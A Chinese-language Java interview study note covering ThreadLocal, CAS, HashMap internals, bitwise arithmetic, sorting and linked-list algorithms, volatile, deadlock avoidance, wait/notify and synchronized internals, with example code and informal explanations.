## 1.ThreadLocal原理(★★★★★)

引用数据类型的时候，都会跟着变

线程副本：线程中传递数据    用户id放入threadLocal，在当前用户操作的任何地方都只会取到当前用户放的id

1.不同的线程(不同的登录用户 你放的是123456  我放的是我的id 78910),针对同一个ThreadLocal取到的是不同的数据

```java
zhangsan  lisi 同时登录系统  tomcat给zhangsan分配的线程是 01,id是123456  
给李四分配的是线程02 id 6666
public void set(T value) {//userId
    	//获得当前线程 zhangsan 获得的就是01
        Thread t = Thread.currentThread();
    	//根据自己的线程获得了一个ThreadLocalMap
        ThreadLocalMap map = getMap(t);---->Thread对象里面的ThreadLocal.ThreadLocalMap threadLocals;
    	//第一次set的时候 map为null
        if (map != null)
            map.set(this, value);
        else
            createMap(t, value);//第一次zhangsan 调用这个方法
            t.threadLocals = new ThreadLocalMap(this, firstValue);
    }

ThreadLocalMap---->静态内部类，内部维护了一个长度为16的entry数组，entry是一个类 两个属性 一个key ,一个是value
zhangsan调用的时候，首先获得张三线程01里面的一个变量ThreadLocalMap,第一次这个Map没有初始化为null,就调用createMap去创建 就会新建一个entry数组 key是当前的threadLocal对象，value是zhangsan 的id
如果李四再来调用，首先获得lisi的线程02里面的ThreadLocalMap这个对象，按照zhangsan的流程，页会新建对象，放入key为threadLocal对象，value为lisi的userId
zhangsan lisi 拿的不是同一个ThreadLocalMap对象--->thread对象的  zhangsan lisi不同  
```

2.同一个线程，不同threadLocal对象，不会取错

拿到的ThreadLocalMap相同，ThreadLocalMap可以放16个，但是key不同



threadLocal是为了在线程之间传递参数，不侵入业务代码，比如在开发中，有aop记录操作日志，都需要拿到用户的id，而记录日志本来是在权限增删改的时候，核心业务代码是 修改某个用户权限，参数可以没有当前登录用户的id，于是就可以通过threadLocal传递，不会侵入业务代码，当然这样用的原因就是当调用threadlocal.get方法或者set方法的时候，都是根据当前线程对象去拿到自己的ThreadLocalMap,这个ThreadLocalMap其实就是内部维护了一个用户key-value属性，长度为16的entry数组。正是因为拿到都是自己线程对象的map所以不同用户不会取错

## 2.CAS(★★★★★)

加锁：syn关键字，用户状态的切换，消耗效率cpu

CAS 一直在跑无限循环，也会浪费效率

compare and swap ,衡量切换状态损失的效率与无限循环损失的效率



cpu底层支持

内存位置（V）、预期原值（A）和新值(B)

i=10;  A线程拿到i的地址值0x001  10  A把i进行i++ 比较0x001这个地址里面是否是10 如果是10那么就替换为11  如果不是那么这次11为标准

在这里是两个操作，比较与交换,虽然是两个操作，但是Java是调用unsafe类,compareAndSwapObject,调用的汇编语言，在汇编语言中这个两个操作是一个命令,天然具有原子性



问题是：ABA问题，第一次拿到的是10  另外线程先改成11再改成10，我会以为是正确的

```
AtomicStampedReference：ABA问题，只能多加一个标记，版本号每改一次版本更新 
```

不会出现在拿到

A---->i++

**CAS比较并且交换在汇编层面是通过一条指令来执行，lock cmpxchg**

## 3.hashMap、hashTable与concurrentHashMap(★★★★★)

1.hashMap允许null键值，hashTable不允许

2.hashTable线程安全，hashMap不安全

```java
hash表：1.7以前是数组+链表，链表极端情况，会出现线性查找，为了提高查询效率1.8引入了红黑树，基本不太可能变成红黑树，more: less than 1 in ten million
hashMap不安全:
put----putVal--->(key的hash值，key，value，false，true)


 final V putVal(int hash, K key, V value, boolean onlyIfAbsent,
                   boolean evict) {
    	//变量申明
        Node<K,V>[] tab; Node<K,V> p; int n, i;
    	//内部是一个Node数组table  Node{key的hash值，key，value，next}
        if ((tab = table) == null || (n = tab.length) == 0)
            n = (tab = resize()).length;//初始化长度为16的数组
    	///对key求hash值，找出放的下标，取出当前下标的元素
        if ((p = tab[i = (n - 1) & hash]) == null)
            //说明当前没有发生hash碰撞，也就是这个key要放的地方还没有元素
            tab[i] = newNode(hash, key, value, null);//所以直接放入
        else {//hash冲突
            Node<K,V> e; K k;
            //在判断当前这个key要放的位子存在那个元素是否key和这个key相等
            if (p.hash == hash &&//hash值相等，判断地址值或者equals方法相等
                //每一个keyhashmap是先取得这个key的hash(hashCode方法)值，然后通过二次位移扰动,得到hash值
         		//java里面比较两个引用数据类型是先比较hashcode方法----再比较equals方法		
                ((k = p.key) == key || (key != null && key.equals(k))))
                e = p;//替换
            else if (p instanceof TreeNode)//是否已经是树了
                e = ((TreeNode<K,V>)p).putTreeVal(this, tab, hash, key, value);
            else {
                //比较当前 下标的所有元素
                for (int binCount = 0; ; ++binCount) {
                    if ((e = p.next) == null) {//下一个为null
                        p.next = newNode(hash, key, value, null);//下一个就是新放入的值
                        //binCount:记录的当前这个链表的长度,bincount是0开始的所有-1
                        //8转，链表长度大于等于8转成红黑树 
                        if (binCount >= TREEIFY_THRESHOLD - 1) // -1 for 1st
                            //数组长度小于等于64就没有树化 是扩容
                            //回来的条件， 链表长度<=6
                            treeifyBin(tab, hash);//内部还有一个条件，是数组长度>=64
                        
                        break;
                    }
                    if (e.hash == hash &&//在这一条链表中有任何一个元素的key是相等就替换
                        ((k = e.key) == key || (key != null && key.equals(k))))
                        break;
                    p = e;//滚动循环
                }
            }
            //出现了相同的key
            if (e != null) { // existing mapping for key
                V oldValue = e.value;
                if (!onlyIfAbsent || oldValue == null)
                    e.value = value;//替换新值
                afterNodeAccess(e);
                return oldValue;//返回老值
            }
        }
        ++modCount;//记录hashmap增加的次数
        if (++size > threshold)//threshold==长度*加载因子 默认16*0.75
            resize();//扩容
        afterNodeInsertion(evict);
        return null;
    }

使用hashMap的时候，16---到了12就扩容(效率低),就放13个元素
new HashMap(16,1) 长度为取大于传递参数的的2的倍数  你放13 --->16 (hash的扰动方法用的位移)
```

```
hashMap线程不安全，put get都不安全
resize() cpu100% 回环  会在jdk1.7以前出现 自己可以搜来看看

jdk1.7分段锁
concurrentHashMap:不允许空键值
1.8CAS+syn
在放入key的时候，如果当前key对应下标位置没有元素 采用cas保证线程安全
当前key应该放在位置有元素了，利用synchronized(锁芯是当前这个位置的第一个元素)
为什么使用cas为什么使用syn
```



## 4.LRU(★★★)

Least recently used，最近最少使用淘汰算法

假如三个元素 

A D C   

加元素的D时候判断是否 在队列中 如果在 删除队列中的D ，把D放在末尾

新加元素放不下了 会直接删除最后一个

```java
 public  LinkedList<String> linkedList = new LinkedList();
    private int size;
    public void put(String str){   
        //里面是否已经包含元素
        if(linkedList.contains(str)){
            linkedList.remove(str);
        }else if(size==3){//说明三个元素
            linkedList.removeFirst();
        }else{
            size++;
        }

        linkedList.addLast(str);
    }
```



## 5.二进制(★★★★★)

1.求6&3，-6&-3的值

```
Java使用 补 码 来 表 示 二 进 制 数 ,在补 码 表 示 中 ,最高 位 为 符号 位 ,正数 的 符 号 位 为 0,负数 为 1。补 码 的 规 定 如 下 :

对 正 数 来 说 ,最高位为 0,其余 各 位 代 表 数 值 本 身 (以二 进制 表 示 ),如 +42的补码 为 00101010。2 8 32
对 负 数 而 言 ,把该 数 绝 对 值 的 补 码 按 位 取 反 ,然后 对 整 个数 加 1,即得 该 数的 补 码 。 如 -1的补 码 为11111111111111111111111111111111(00000000000000000000000000000001按 位 取 反 11111111111111111111111111111110+1=11111111111111111111111111111111 )。为何有那么多0、1，java中int是32位的。


例如：
6&3=2
6---->110
3---->011
得到结果010=2

-6&-3=-8
-6 00000000000000000000000000000110-->11111111111111111111111111111001+1
11111111111111111111111111111010
-3 00000000000000000000000000000011-->11111111111111111111111111111100
11111111111111111111111111111101

11111111111111111111111111111000-1
11111111111111111111111111110111取反
00000000000000000000000000001000
-8

-6---->00000000000000000000000000000110取反11111111111111111111111111111001
然后加1 等于11111111111111111111111111111010
-3---->00000000000000000000000000000011取反11111111111111111111111111111100
然后加1 等于11111111111111111111111111111101
两个结果取& 等于11111111111111111111111111111000 
然后-1 等于11111111111111111111111111110111 
取反得到00000000000000000000000000001000=8
这是取反的结果原来符号为1，所以是-8



其它：

	按位或（|）

		只有两个操作数对应位同为0时，结果为0，其余全为1.（或者是只要有一个操作数为1，结果就为1）。

	按位非（~）

		源操作数为0变为1 源操作数为1变为0

		例如：~-5=4

		参照前面的补码取反：

		-5---->0....00101-取反–>1...11010+1=1...11011后运行按位~=0...00100
		
		按位异或的运算规则^

		前后两数不同即为1  2^1==010 001 011

    左位移（<<）

     符号位不变，低位补0。如：2<<2结果为8。 0010-->1000

     2---->00010

     左移两位01000结果为8

   右位移（>>）

   低位溢出，符号位不变，并用符号位补溢出的高位。如：-6>>2结果为-2。

   -6----->0...00110取反1...11001+1---->1...111010--0--->1...111110-1--->1...111101

    右移两位符号位不变得11110然后-1按位取反得到00010 所以是-2

无符号右移（>>>）
	-6>>>2  0...0110 -->1...1001--->1...1010--->001...1110

   低位溢出，高位补0。注意，无符号右移（>>>）中的符号位（最高位）也跟着变，无符号的意思是将符号位当作数字    位看待

   所以-6>>>2得到的结果是：1073741822

   -1>>>1得到Integer.MAX_VALUE
————————————————
版权声明：本文为CSDN博主「说重点丶」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/weixin_39160689/article/details/113923554
```

### 利用&符号能否判断一个数的奇偶

0--->偶数

1---->奇数

n&1==1 奇数

n&0==0偶数

## 6.Buffer

io流的缓存



1.大文件中统计某个字符出现个数 a

请问有中文吗?--->丢失一两个

英文:randomAccessFile.length() 10亿

10个线程

第一个线程就从0 1亿

1-2

```java
 public static void main(String[] args) throws IOException {
        Map<Character,Integer> map = new HashMap<>();
        RandomAccessFile randomAccessFile = new RandomAccessFile("d://a.txt","r");
       long start=System.currentTimeMillis();
        //通道
       // FileChannel channel = randomAccessFile.getChannel();
        //创建byte缓冲数组
        //ByteBuffer allocate = ByteBuffer.allocate(100);
        byte[] bytes = new byte[1024];
        int position =0;
        while((position=randomAccessFile.read(bytes))!=-1){
            String s = new String(bytes,0,position);
            count(map,s);
        }
        System.out.println(map);
        System.out.println(System.currentTimeMillis()-start);
    }

    private static void count(Map<Character, Integer> map, String s) {
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            if(map.containsKey(c)){
                map.put(c,map.get(c)+1);
            }else{
                map.put(c,1);
            }
        }

    }
```

```java
package cn.wanghan.fx.file;

import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicInteger;

public class RandomAccessFileTest2 {
    public static void main(String[] args) throws IOException, ExecutionException, InterruptedException {
        ConcurrentHashMap<Character,Integer> map = new ConcurrentHashMap<>();
        RandomAccessFile randomAccessFile = new RandomAccessFile("d://a.txt","r");
        long length = randomAccessFile.length();
        int l = (int)(length / (1000000*2));//真的两个G可以改成一个亿
        ExecutorService executorService = Executors.newFixedThreadPool(l);
        for(int i =0;i<l;i++){
           final AtomicInteger atomicInteger = new AtomicInteger(0);
            executorService.execute(()->{
                RandomAccessFile r = null;
                try {
                    r = new RandomAccessFile("d://a.txt","r");
                    r.seek(atomicInteger.getAndIncrement()*100000);
                } catch (FileNotFoundException e) {
                    e.printStackTrace();
                } catch (IOException e) {
                    e.printStackTrace();
                }
                byte bytes[] = new byte[1024];
                int len;
                int count=0;
                    try {
                        while ((len=r.read(bytes))!=-1) {
                            count+=len;
                            if(count>=100000){
                                String s = new String(bytes, 0, len-(count-100000));
                                count(map,s);
                                r.close();
                                break;
                            }
                            String s = new String(bytes, 0, len);
                            count(map,s);
                        }
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                    
            });
        }
        executorService.shutdown();
        while (Thread.activeCount()>2)Thread.yield();
        System.out.println(map);

    }
    private static void count(ConcurrentHashMap<Character,Integer> map, String s) {
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            if(map.containsKey(c)){
                map.put(c,map.get(c)+1);
            }else{
                map.put(c,1);
            }
        }

    }
}

```

## 7.排序(★★★★★)

选择、插入、冒泡、归并、快速、二分查找

**插入**

```java
public static void main(String[] args) {
        int arr[] = {1,2,5,4,3};
        insertSort2(arr);
        Arrays.stream(arr).forEach(System.out::println);
    }

    private static void insertSort2(int[] arr) {
        for(int i=1;i<arr.length;i++){
            int temp = arr[i];
            int j=i-1;
            for(;j>=0;j--){
                if(temp<arr[j]){//{1,2,4,5,3}  {1,2,4,5,5} {1,2,4,4,5}
                    arr[j+1]=arr[j];
                }else break;
            }
            arr[j+1]=temp;
        }
    }

    private static void insertSort(int[] arr) {
        for(int i=1;i<arr.length;i++){
            for(int j=i-1;j>=0;j--){
                if(arr[j+1]<arr[j]){/// {1,2,4,5,3}
                    int temp = arr[j];
                    arr[j]=arr[j+1];
                    arr[j+1]=temp;
                }else break;
            }
        }

    }
```

**选择**

```java
 public static void main(String[] args) {
        int arr[] = {5, 8 ,9 ,4, 7 ,10 ,13 ,5 ,7, 4,6,3};
        choiceSort(arr);
        Arrays.stream(arr).forEach(System.out::println);

    }

    private static void choiceSort(int[] arr) {
        for(int i = arr.length-1;i>0;i--){
            //选出最大的
            int k = 0;
            for(int j = 1;j<=i;j++){//找出当前剩余未排序的最大值的下标
                if(arr[k]<arr[j]){
                    k=j;
                }
            }
          int temp = arr[i];
            arr[i] = arr[k];
            arr[k]=temp;
        }
    }
```

**快速排序**

```java
    public static void main(String[] args) {
        int arr[] = {5, 8 ,9 ,4, 7 ,10 ,13 ,5 ,7, 4,6,8,9,10,2};
        fastSort(arr,0,arr.length-1);
        Arrays.stream(arr).forEach(System.out::println);

    }

    private static void fastSort(int[] arr,int low,int high) {
        int begin = low;
        int end = high;
        int key = arr[begin];
        while(end>begin){
            while(end>begin&&key<=arr[end]){
                end--;
            }
            if(end>begin&&key>arr[end]){//{4, 8 ,9 ,4, 7 ,10 ,13 ,5 ,7, 5,6,8,9,10};
                arr[begin] = arr[end];
                arr[end] = key;
            }
            while(end>begin&&key>arr[begin]){
                begin++;
            }
            if(end>begin&&key<arr[begin]){//{4, 5 ,9 ,4, 7 ,10 ,13 ,5 ,7, 8,6,8,9,10};
                arr[end]=arr[begin];
                arr[begin] = key;
            }
        }
        //{4, 4,5 ,9 , 7 ,10 ,13 ,5 ,7, 8,6,8,9,10}
        if(begin>low)fastSort(arr,low,begin-1);
        if(high>end)fastSort(arr,end+1,high);
    }
```

**归并**

```java
public class MergeSort implements IArraySort {

    @Override
    public int[] sort(int[] sourceArray) throws Exception {
        // 对 arr 进行拷贝，不改变参数内容
        int[] arr = Arrays.copyOf(sourceArray, sourceArray.length);

        if (arr.length < 2) {
            return arr;
        }
        int middle = (int) Math.floor(arr.length / 2);

        int[] left = Arrays.copyOfRange(arr, 0, middle);
        int[] right = Arrays.copyOfRange(arr, middle, arr.length);

        return merge(sort(left), sort(right));
    }

    protected int[] merge(int[] left, int[] right) {
        int[] result = new int[left.length + right.length];
        int i = 0;//{1,4,5}  {3 9 10}
        while (left.length > 0 && right.length > 0) {
            if (left[0] <= right[0]) {
                result[i++] = left[0];
                left = Arrays.copyOfRange(left, 1, left.length);
            } else {
                result[i++] = right[0];
                right = Arrays.copyOfRange(right, 1, right.length);
            }
        }

        while (left.length > 0) {
            result[i++] = left[0];
            left = Arrays.copyOfRange(left, 1, left.length);
        }

        while (right.length > 0) {
            result[i++] = right[0];
            right = Arrays.copyOfRange(right, 1, right.length);
        }

        return result;
    }

}
```

## 8.递归反转字符串(★★★★★)

```java
 public static void main(String[] args) {
        String str = "abc";//c +ab b+c+a
        String reverseStr =  reverse(str);
        System.out.println(reverseStr);
    }

    private static String reverse(String str) {
        if(str.length()==1)return str;//abc 
        //c+b+a reverse(ab)
        //reverse(ab)--->b+a
        return str.substring(str.length()-1)+reverse(str.substring(0,str.length()-1));
    }
```

## 9.单链表(★★★★★)

```java
package cn.wanghan.fx.linkedlist;

public class Node {
    Node next;
    Object data;

    public Node(Node next, Object data) {
        this.next = next;
        this.data = data;
    }

    @Override
    public String toString() {
        return "Node{" +
                " data=" + data +
                '}';
    }
}

```

```java
package cn.wanghan.fx.linkedlist;

public class MyLinkedList {
    Node  head;//当前链表是否有
    int size;
    Node last;//记录末尾
    public void add(Object obj){
        //加在末尾 下一个未null
        Node node = new Node(null, obj);
        //两种情况 1.链表都没有  2.链表有了 就放在末尾
        if(head==null){
            head = node;
            last = node;
        }else{
            last.next = node;
            last = node;
        }
        size++;
    }
    public int size(){
        return size;
    }
    public Iterator iterator(){
        return new A();
    }
    class A implements Iterator{
        int k = size;//5
        @Override
        public boolean hashNext() {
            return k>0;
        }
        Node head2 = head;
        @Override
        public Object next() {
            if(k==0) throw new IndexOutOfBoundsException();
            Node current = head2;
            head2 = head2.next;
            k--;
            return current;
        }
    }

    public static void main(String[] args) {
        MyLinkedList myLinkedList = new MyLinkedList();
        myLinkedList.add("张三");
        myLinkedList.add("王五");
        myLinkedList.add("李四");
        System.out.println(myLinkedList.size());
        Iterator iterator = myLinkedList.iterator();
        while(iterator.hashNext()){
            Object next = iterator.next();
            System.out.println(next);
        }
        iterator.next();
    }
}


```

## 10.实现链表反转(★★★★★)

```java
private void reverse() {//从头开始反转
        Node pre = null;
        Node current = head;//a-b-c-d
        while(current!=null){
            //下一个记录下来
            Node next = current.next;//b
            current.next = pre;//指向前一个 a--null
            pre = current;
            current = next;
            if(current==null) head=pre;//head就等于最后一个
        }
    }
```

```java
  //递归反转  从末尾开始反转
    private Node reverse2(Node head){// 3个节点  a - b -c
        if(head.next==null) return head;
        Node node = reverse2(head.next);
        head.next.next = head;//a让b指向a
        head.next=null;
        return node;
    }
```

## 11.二叉树

```java
package cn.wanghan.fx.tree;

public class MyTree {

    int count;
    Node head;
    //返回值是树的根节点
    public Node add(Node root,int data){
        if(root==null){
            count++;
            return new Node(data,null,null);
        }
        if(root.data==data){//只有一个元素 替换就完了
        }
        if(root.data>data){
            root.left = add(root.left,data);
        }
        if(root.data<data){
            root.right = add(root.right,data);
        }
        return root;
    }

}
class Node{
    Node left;//左下
    Node right;//右下
    int data;

    public Node(int data,Node left, Node right) {
        this.left = left;
        this.right = right;
        this.data = data;
    }
}

```

## 12.动态规划(★★★★)

```java
数字塔是第i行有i个数字组成，从上往下每个数字只能走到他正下方数字或者正右方数字，求数字塔从上到下所有路径中和最大的路径，如有下数字塔

7
3 8
8 1 0
2 7 4 4
4 5 2 6 5
7
3 8
8 1 0
7 12 10 10
    
7
3 8
20 13 10

7
23 21
package cn.wanghan.junge;

public class DTGH {
    public static void main(String[] args) {
        /**
         * 7
         * 3 8
         * 8 1 0
         * 2 7 4 4
         * 4 5 2 6 5
         */
        int arr[][] = {
                {7,0,0,0,0},
                {3,8,0,0,0},
                {8,1,0,0,0},
                {2,7,4,4,0},
                {4,5,2,6,5},
        };
        //创建一个数组来保存 每个值到最后的最大值
        int result[][]=new int[5][5];
        //从最后一行开始循环
        for(int i = arr.length-1;i>=0;i--){
            //最后一行的最后一个开始循环，第五行就有5个数字，第一行就一个数字 所以i=行数-1 j<=i
            for(int j=0;j<=i;j++){
                //当是最后一行得到时候 每个数字的到最后的和就是本身
                if(i==arr.length-1){
                    result[i][j]=arr[i][j];
                    continue;
                }
                //result[i][j] 就保存了 第i+1行 第j+1列到后面的最大值
                //arr[i][j]就是本身第i+1行 第j+1列的值 比如i为3行 j是0 那么就是第四行第一列的值2
                //Math.max(result[i+1][j],result[i+1][j+1])这个是求出 2正下方与2的正前下方得到的结果最大值
                //所以行数是i+1 j列跟j+1列比较的最大值
                result[i][j]=arr[i][j]+Math.max(result[i+1][j],result[i+1][j+1]);
            }
        }
        //路径最大值就是第一位
        System.out.println(result[0][0]);
        //可以打印出每一个数字到最后的最大值
        for (int j=0;j< result.length;j++) {
            for (int i = 0; i < result[j].length; i++) {
                System.out.print(result[j][i]);
                System.out.print("  ");
            }
            System.out.println();
        }
    }
}


```

## 13.面试需要掌握的问题

项目---分布式技术  项目---分布式技术

1.java基础  2.多线程 3.mysql（sql语句） 原理 优化 4.spring  5.redis 6.jvm 7.源码

## 14.多线程

### **1.进程与线程的区别(重要)**

1.进程操作系统中的一个程序，比如qq，360

2.线程是进程中的执行线路

3.线程与进程在多核cpu进程可以并发执行

4.cpu在同一时刻只能运行一个程序，线程抢占CPU

### 2.多线程为什么能提高效率(★★★★★)

在多核cpu多线程肯定能提高效率

即使在单核情况下，DMA 操作是磁盘到内核,cpu处于闲置状态，IO操作多线程都能提高效率，IO操作里面不仅仅是cpu在跑。数据库操作也是io操作



到底启动多少个线程好呢？非常重要优化手段 

IO/cpu时间          5个程序，1个程序有IO （4秒）cpu 1秒

提供很多apm工具 ：site24x7

### 3.volatile(★★★★★)

```java
/**
 * 1.可见性问题，
 * volatile：同一个变量，有一个地方修改了，
 * 其它的高速全部失效，强制从新从内存中读取(读取会等待其它地方写完)
 * 2.有序性,指令重排序(内存屏障)  只要 volatile修饰的变量，
 * 这个变量的一行代码的操作就会有内存屏障 包起来
 * 必须要等到三个指令执行完了 才会是后续的操作 ,
 * 内存屏障能保证在内存屏障前面的代码一定先执行  后面的一定后执行
 * 【 分配空间 赋予地址值 初始化 】 ----本地缓存
 * 需要把这个变量的改变映射到内存中
// * 3.不能保证原子性
 i++ 读取i的值 修改i的值 (另外的线程改了i的值，因为可见性，强制从新读取)写入主存
 */
public class SingletonTest2 {
    private static volatile SingletonTest2 singletonTest;
    private SingletonTest2(){}
    public static  SingletonTest2 getInstance(){
        if (singletonTest == null) {//双重检查
            synchronized (SingletonTest2.class) {
                if (singletonTest == null) {
                    //原子性 1.读  2.改0x002(失效 读取到0x001)3.写   0x001
                    singletonTest = new SingletonTest2();
                }
            }
        }
        return singletonTest;
    }
}

```

**原子性问题**

```java
public class Test {
    //volatile:不能保证原子性
    //1.从共享内存读取值 2.修改值 3.写入共享内存  不保证这三步同时执行
    //A线程拿到i=10 执行i++ 卡住
    //B线程拿到i=10 执行i++ 写入主存
    //A线程继续执行 因为volatile的关系导致i失效，所以从新从主存读取 i=11,但是前两步已经执行完了，只剩下第三步写入主存
    static volatile  int i =0;

    public static void main(String[] args) {
        for (int i1 = 0; i1 < 20; i1++) {
           new Thread(new Runnable() {
               @Override
               public void run() {
                   for (int i2 = 0; i2 < 1000; i2++) {
                       i++;
                   }
               }
           }).start();
        }
        //Thread.activeCount()当前程序中运行线程数
        //守护线程(精灵线程)：垃圾回收
        while(Thread.activeCount()>2){
            //礼让：让出cpu让所有线程在一起抢cpu
            Thread.yield();
        }
        System.out.println("i的值为："+i);

    }
}
```

**syn:保证可见性，有序性(单个线程里面的有序性),原子性**

**volatile:保证了可见性，有序性，不能保证原子性**

## 15.死锁(★★★★★)

```java
package cn.wanghan.dead;

public class MyDeadLock implements Runnable{
    private MyLock myLock1 = new MyLock();
    private MyLock myLock2 = new MyLock();

    @Override
    public void run() {
        synchronized (myLock1){
            //Thread-1获得了myLock1
            System.out.println(Thread.currentThread().getName()+"获得了myLock1");
            synchronized (myLock2){
                System.out.println(Thread.currentThread().getName()+"获得了myLock2");
            }
        }

        synchronized (myLock2){
            //Thread-0获得了myLock2
            System.out.println(Thread.currentThread().getName()+"获得了myLock2");
            synchronized (myLock1){
                System.out.println(Thread.currentThread().getName()+"获得了myLock1");
            }
        }
    }

    public static void main(String[] args) {
        MyDeadLock myDeadLock = new MyDeadLock();
        new Thread(myDeadLock).start();
        new Thread(myDeadLock).start();
    }
}

class MyLock{}
```

线程之间互相等待对方释放锁，就是死锁

**编号解死锁**：对多把锁 按从小到大排序，每个要用多锁的地方，都先锁小的，再锁大的。

```java
package cn.cdqf.deadlock;
//一般syn里面锁芯不用String 因为String会放在字符串常量池，所以容易出现多个地方锁相同
//也少用Integer -128---127被缓存了的 是同一个对象
public class DeadLockTest {
    private MyLock myLock1 = new MyLock(1);
    private MyLock myLock2 = new MyLock(2);

    public void test1(){
        //一个地方 A在前B在后 另外一个地方B在前 A在后
        //现在给锁编号 那么永远小的在前
        if(myLock1.getI()<myLock2.getI()){
            synchronized (myLock1){
                try {
                    Thread.sleep(300);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                synchronized (myLock2){

                }
            }
        }else {
            synchronized (myLock2){
                try {
                    Thread.sleep(300);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                synchronized (myLock1){

                }
            }
        }

    }
    public void test2(){
        if(myLock1.getI()<myLock2.getI()){
            synchronized (myLock1){
                try {
                    Thread.sleep(300);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                synchronized (myLock2){

                }
            }
        }else {
            synchronized (myLock2){
                try {
                    Thread.sleep(300);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                synchronized (myLock1){

                }
            }
        }
    }
}
class MyLock{int i; public MyLock(int i ){this.i=i;}}
```

## 16.wait/notify/notifyall(★★★★★)

wait():等待，释放锁

Sys....(A){}:A对象锁代码块里面的notify只能叫醒A对象代码里面wait

**对象出生的时候 会有另外一个对象 moniter监视器对象 waitList()**

1.同步代码块里面运行:否则**java.lang.IllegalMonitorStateException**：**依赖对象**

2.调用wait方法的对象必须跟锁对象相同，**必须是锁对象调用方法**

3.Object方法：wait/notify/notifyall

4.notify随机叫醒一个wait

5.notifyAll当前对象所有的wait()

A  B{A.join}  B线程需要等到A线程执行结束才继续执行





wait/notify必须要同步代码块中使用

当前所对象的包含的代码中没有wait的线程，没法叫

当前锁对象中的notify/notifyAll只能叫醒，当前锁对象包含中的wait()



wait与notify与notifyAll锁对象是谁就必须用锁对象来调用方法，不然会出现IllegalMonitorStateException

**这三个方法都是在Object类，所以每一个对象都有这三个方法**



一般都用notifyAll：叫醒当前锁对象中所有的wait方法

notify：随机叫一个

被wait以后会释放锁

```java
package cn.wanghan.pc;

import java.util.List;
import java.util.concurrent.CopyOnWriteArrayList;

public class BaoZi {
    private String[] strings = new String[5];
    //用来记录当前数组装了多少个
    private int i = 0;
    //一个方法生产 放在集合中
    public synchronized void push(String str){
       if(i==strings.length){

           //等待别人吃
           try {
               System.out.println("放不下了...");
               wait();//无限等待 直到notify/notifyAll
           } catch (InterruptedException e) {
               e.printStackTrace();
           }
       }
        System.out.println(str);
        strings[i++] = str;
        notify();//叫别人吃
    }
    //一个方法从集合中拿包子eat
    public synchronized String pop(){
        if(i==0){
            try {
                System.out.println("没吃的了");
                wait();//无限等待 直到notify/notifyAll

            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
        String  str = strings[--i];
        strings[i]=null;
        System.out.println("当前曹相科吃掉："+str);
        notify();//继续生产包子
        return str;
    }
}

```



```java
package cn.wanghan.pc;

public class Test {
    public static void main(String[] args) {
        BaoZi baoZi = new BaoZi();
        new Thread(new Runnable() {
            @Override
            public void run() {
                for (int i = 0; i < 200; i++) {
                    baoZi.push("生产的第:"+i+"个包子");

                }
            }
        }).start();
        new Thread(new Runnable() {
            @Override
            public void run() {
                for (int i = 0; i < 200; i++) {
                    String pop = baoZi.pop();

                    try {
                        Thread.sleep(520);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }
        }).start();
    }
}

```

## 17.Object类的方法(★★★★★)

```java
 public final native Class<?> getClass();
 获得类的class对象 存储了类的元信息，这个存于元空间里面,每个类唯一的对象，创建java对象的时候就会根据这个信息来创建.当然要反射需要拿到这个对象，，，，，，，
 public native int hashCode(); 计算对象hash值，常用于比较，最常见就是在hash算法中，比如hashMap
  public boolean equals(Object obj);java规定两个对象是否相等，先比较hashcode再比较equals方法
   protected native Object clone();计算机底层直接复制对象，比创建对象要快，如果再项目中需要大量相同的对象，就可以用clone，原型设计模式，spring框架也用了，bean scope=prototype
   notify,notifyAll,wait 参考上面
   protected void finalize();垃圾回收相关
 
```

## 18.线程生命周期(★★★★★)

1.sleep属于Thread类里面的方法 睡觉时间可以指定 **睡觉中途不释放锁**（跟哪个线程无关）

2.wait是是属于Object方法 等待的时候 **会释放锁**,必须运行在同步代码块种，依赖对象头存在（锁芯），正常情况下必须等到对应的锁芯对象notify或者notifyall才能叫醒

3.无论是wait还是sleep都可以被interrupt

新建----就绪(抢占cpu)-----运行（有时间阻塞，无时间阻塞join()在B线程中使用A.join,B线程后续的代码要等到A线程执行完）,如果出现阻塞就会进入就绪阶段----------死亡

## 19.List/set下线程安全类(★★★★★)

ArrayList线程不安全，放入数组是依靠size属性，size是成员变量，线程可以同时操作**elementData[size++] = e**;，增加的时候就可能出现覆盖

vector线程安全，但是效率低，读读没有线程问题，但是加了锁，读写有问题

一个集合读取的时候最多，

copyOnWriteArrayList，读写分离，比如你要向数组增加元素，复制一个新数组，在新数组里面去修改，有一个线程增加就复制一份。每个线程都复制了一份，没有线程问题，修改加了锁的，锁新数组

效率就提升在，修改时候依然可以读取原来的数组，增加了读的效率

**问题就在于：1.空间浪费，空间换时间 2.数据不一致，修改完了，还需要替换原来的数组，在这个过程数据不一致**

读写分离的集合，应用在读多写少                 

```java
CopyOnWriteArraySet  CopyOnWriteArrayList
```

## 20.synchronized底层原理(★★★★★)

```
synchronized:
作用在普通方法上，锁的是this
作用在静态方法上，锁的是class对象

synchronized:等待锁不能被打断，在同步代码块执行完毕释放锁，同步代码块抛异常释放锁
```

```
对象在内存中得布局：
​	对象头
​	实例数据
​	对齐填充
对象头：
class metadata address:指向class对象的指针，虚拟机可以确定该对象时哪个class的实例
mark word：对象的信息，标志位等，实现锁的关键  id属性：当前持有该锁的线程id 
对象的信息：hashcode，分代年龄:gc 垃圾回收
锁标志位: 01(无) 00(轻量级) 10  轻量级 重量级不同的 

每一个对象 对应一个moniter 1对一关系，出生的时间跟jvm相关，创建对象就有moniter，第一次使用对象作为锁的时候就创建moniter
ObjectMoniter.hpp c++实现  父类
很多属性，其中四个属性
waitset:保存抢到该锁以后调用wait方法的线程，
entrylist：记录没有抢到锁的线程。多个线程  5个线程来抢锁，某个线程抢到锁，对象mark word id=当前线程的id
owner：抢到锁的线程，这把锁的持有者    如果释放锁，owner置空
count:+1     -1   可重入锁

